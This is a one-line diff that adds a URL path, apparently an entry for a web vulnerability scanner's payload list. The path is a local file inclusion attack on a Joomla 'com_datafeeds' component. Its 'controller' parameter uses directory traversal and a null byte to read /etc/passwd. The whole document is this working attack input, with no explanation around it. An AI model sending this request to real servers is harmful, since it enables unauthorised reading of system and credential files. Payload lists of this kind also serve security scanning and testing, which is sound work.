@@ -1,0 +1,1 @@
+/index.php?option=com_datafeeds&controller=../../../../../../../../../../etc/passwd%00
